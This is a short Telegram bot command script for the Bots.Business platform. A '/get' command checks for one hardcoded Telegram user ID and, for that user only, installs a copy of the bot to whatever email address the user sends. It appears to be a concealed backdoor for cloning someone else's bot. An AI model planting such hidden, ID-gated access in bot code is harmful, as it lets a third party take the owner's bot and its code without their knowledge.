/*CMD
  command: /get
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

if(user.telegramid == 5654633909){
BBAdmin.installBot({
  email: message,
  bot_id: bot.id
})}
Bot.sendMessage("done")
